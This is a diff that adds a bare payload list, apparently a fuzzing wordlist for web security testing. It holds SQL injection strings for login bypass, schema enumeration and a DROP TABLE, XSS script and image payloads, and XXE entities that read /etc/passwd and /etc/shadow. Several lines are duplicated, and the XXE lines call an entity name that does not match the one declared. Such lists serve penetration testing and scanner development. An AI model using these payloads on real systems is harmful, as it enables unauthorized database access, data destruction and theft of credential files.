@@ -1,0 +1,36 @@
+' OR 1=1--
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+>"><script>alert("XSS")</script>&
+'';!--"<XSS>=&{()}
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+' ; drop table temp --
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select
+Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xee;</foo>
+<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///dev/random">]><foo>&xee;</foo>
